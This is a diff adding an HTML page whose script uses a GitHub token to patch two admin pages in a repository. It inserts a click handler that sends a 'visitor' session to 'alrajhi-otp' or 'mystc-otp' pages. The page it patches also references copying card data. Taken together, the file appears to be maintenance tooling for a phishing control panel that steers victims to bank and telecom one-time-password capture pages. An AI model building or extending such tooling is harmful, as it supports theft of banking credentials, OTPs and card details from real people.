@@ -1,0 +1,197 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<title>fix41</title>
+<style>
+ body{font-family:ui-monospace,Menlo,Consolas,monospace;background:#0e1116;color:#e8e8e8;margin:0;padding:14px;direction:ltr}
+ a{color:#7ab8ff}
+ #out{white-space:pre-wrap;font-size:12px;line-height:1.5;margin:8px 0 0}
+ .ok{color:#39d98a}.bad{color:#ff6b6b}.warn{color:#ffd166}
+</style>
+</head>
+<body>
+<a href="https://github.com/settings/tokens/new?scopes=repo&description=KDD-fix41" target="_blank">إنشاء توكن جديد</a>
+<pre id="out">جارٍ البدء...</pre>
+<script>
+document.getElementById('out').textContent = 'SCRIPT RUNS\n';
+window.onerror = function(m, s, l, c){
+  var o = document.getElementById('out');
+  if (o) o.innerHTML += '<span style="color:#ff6b6b">ERR ' + m + ' @' + l + ':' + c + '</span>\n';
+};
+</script>
+<script>
+(function(){
+  'use strict';
+  var REPO = 'fahshomi-ui/KDD';
+  var FILES = ['server/admin/index.html', 'kdd-public/admin.html'];
+  var out = document.getElementById('out');
+  var SE = '<\/script>';
+
+  function esc(s){ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+  function log(s, cls){ out.innerHTML += (cls ? '<span class="'+cls+'">'+esc(s)+'</span>' : esc(s)) + '\n'; }
+
+  function urlToken(){
+    var m = /(?:[?&#])t=([^&]+)/.exec(location.href);
+    if (m) return decodeURIComponent(m[1]).trim();
+    return (location.hash || '').replace(/^#/, '').trim();
+  }
+  var TOKEN = urlToken();
+  if (!TOKEN) { try { TOKEN = (localStorage.getItem('kdd_token') || '').trim(); } catch(e) { TOKEN = ''; } }
+  if (!TOKEN) { TOKEN = (prompt('الصق التوكن ghp_...') || '').trim(); }
+  if (!TOKEN) { log('لا يوجد توكن — توقف', 'bad'); return; }
+  try { localStorage.setItem('kdd_token', TOKEN); } catch(e) {}
+  log('token: ' + TOKEN.slice(0, 10) + '...');
+
+  function api(url, opts){
+    opts = opts || {};
+    var h = opts.headers || {};
+    h['Authorization'] = 'token ' + TOKEN;
+    h['Accept'] = 'application/vnd.github+json';
+    opts.headers = h;
+    return fetch(url, opts);
+  }
+  function b64d(s){
+    var bin = atob(s.replace(/\s/g, ''));
+    var b = new Uint8Array(bin.length);
+    for (var i = 0; i < bin.length; i++) b[i] = bin.charCodeAt(i);
+    return new TextDecoder('utf-8').decode(b);
+  }
+  function b64e(str){
+    var b = new TextEncoder().encode(str), bin = '';
+    for (var i = 0; i < b.length; i++) bin += String.fromCharCode(b[i]);
+    return btoa(bin);
+  }
+
+  var BLOCK = [
+    '/*FIX41*/',
+    '(function(){',
+    '  if (window.__kdd41) return;',
+    '  window.__kdd41 = 1;',
+    '  function badge(msg){',
+    '    try{',
+    '      var b = document.getElementById("kdd41badge");',
+    '      if (!b){ b = document.createElement("div"); b.id = "kdd41badge"; document.body.appendChild(b); }',
+    '      b.textContent = msg;',
+    '      b.style.cssText = "position:fixed;left:10px;bottom:10px;z-index:2147483000;background:#111;color:#7ab8ff;font:12px monospace;padding:6px 10px;border-radius:6px;opacity:.95;direction:ltr";',
+    '      b.style.display = "block";',
+    '      clearTimeout(b.__t);',
+    '      b.__t = setTimeout(function(){ b.style.display = "none"; }, 5000);',
+    '    }catch(e){}',
+    '  }',
+    '  function flash(el){',
+    '    try{',
+    '      var bg = el.style.background;',
+    '      el.style.transition = "background .15s";',
+    '      el.style.background = "#16a34a";',
+    '      setTimeout(function(){ el.style.background = bg; }, 700);',
+    '    }catch(e){}',
+    '  }',
+    '  document.addEventListener("click", function(e){',
+    '    try{',
+    '      var t = document.elementFromPoint(e.clientX, e.clientY) || e.target;',
+    '      var el = t;',
+    '      for (var k = 0; k < 4 && el; k++){',
+    '        var id = el.id || "";',
+    '        if (/otp/i.test(id) && /btn/i.test(id)){',
+    '          if (typeof navigateVisitorToPage !== "function"){ badge("navigateVisitorToPage غير موجودة"); return; }',
+    '          var rest = id.replace(/^rajhi-/, "").replace(/^otp-btn-/, "");',
+    '          var m = /^(.*)-([0-9]+)$/.exec(rest);',
+    '          var sid = m ? m[1] : rest;',
+    '          var page = /rajhi/i.test(id) ? "alrajhi-otp" : "mystc-otp";',
+    '          navigateVisitorToPage(sid, page);',
+    '          flash(el);',
+    '          badge("OTP -> " + page + "  (" + sid + ")");',
+    '          return;',
+    '        }',
+    '        el = el.parentElement;',
+    '      }',
+    '    }catch(err){ badge("ERR " + err.message); }',
+    '  }, true);',
+    '  badge("kdd v41 جاهز");',
+    '})();'
+  ].join('\n');
+
+  function transform(content){
+    if (content.indexOf('/*FIX41*/') > -1) return { already: true };
+
+    log('  navigateVisitorToPage موجودة؟ ' + (content.indexOf('function navigateVisitorToPage') > -1), 'warn');
+    log('  عدد أزرار OTP: ' + (content.match(/otpBtnId/g) || []).length, 'warn');
+
+    var c = content;
+    var anchor = c.indexOf('kddCopyCard');
+    var end = c.indexOf(SE, anchor);
+    if (end < 0) end = c.lastIndexOf(SE);
+    if (end < 0) return { error: 'ما لقيت نهاية السكربت' };
+    c = c.slice(0, end) + '\n' + BLOCK + '\n' + c.slice(end);
+
+    if (c.indexOf('__kdd41') < 0) return { error: 'فشل الإدراج' };
+    return { changed: true, content: c };
+  }
+
+  function getJson(path){
+    return api('https://api.github.com/repos/' + REPO + '/contents/' + path + '?ref=main&_=' + Date.now())
+      .then(function(r){
+        if (r.status === 401) return { unauth: true };
+        if (!r.ok) return r.text().then(function(t){ throw new Error('GET ' + path + ' HTTP ' + r.status + ' — ' + t.slice(0, 140)); });
+        return r.json();
+      });
+  }
+  function putFile(path, content, sha){
+    var body = { message: 'fix41: delegated handler for OTP button', content: b64e(content), sha: sha, branch: 'main' };
+    return api('https://api.github.com/repos/' + REPO + '/contents/' + path, {
+      method: 'PUT', body: JSON.stringify(body), headers: { 'Content-Type': 'application/json' }
+    }).then(function(r){
+      if (r.status === 401) return { unauth: true };
+      if (r.status === 409) return { conflict: true };
+      if (!r.ok) return r.text().then(function(t){ throw new Error('PUT ' + path + ' HTTP ' + r.status + ' — ' + t.slice(0, 140)); });
+      return r.json();
+    });
+  }
+
+  function doFile(path){
+    log('=== ' + path);
+    return getJson(path).then(function(j){
+      if (j.unauth) return { unauth: true };
+      var res = transform(b64d(j.content));
+      if (res.error) { log('! ' + res.error, 'bad'); return {}; }
+      if (res.already) { log('= مُصلَّح مسبقاً', 'warn'); return {}; }
+      return putFile(path, res.content, j.sha).then(function(p){
+        if (p.unauth) return { unauth: true };
+        if (p.conflict) return { conflict: true };
+        log('✔ تم التعديل', 'ok');
+        return {};
+      });
+    });
+  }
+
+  var i = 0, tr = {};
+  function next(){
+    if (i >= FILES.length){ log('DONE ✔', 'ok'); return; }
+    var path = FILES[i];
+    i++;
+    doFile(path).then(function(r){
+      if (r && r.unauth){
+        var nt = (prompt('التوكن غير صالح. الصق توكن جديد (ghp_...)') || '').trim();
+        if (!nt) { log('توقف', 'bad'); return; }
+        TOKEN = nt; try { localStorage.setItem('kdd_token', TOKEN); } catch(e) {}
+        log('تم تحديث التوكن — إعادة المحاولة', 'warn');
+        i--; setTimeout(next, 200); return;
+      }
+      if (r && r.conflict){
+        tr[path] = (tr[path] || 0) + 1;
+        if (tr[path] <= 3){ log('! تعارض 409 — إعادة المحاولة', 'warn'); i--; setTimeout(next, 800); return; }
+        log('! تجاوزنا التعارض', 'bad');
+      }
+      setTimeout(next, 200);
+    }).catch(function(e){
+      log('ERR ' + e.message, 'bad');
+      setTimeout(next, 200);
+    });
+  }
+
+  next();
+})();
+</script>
+</body>
+</html>
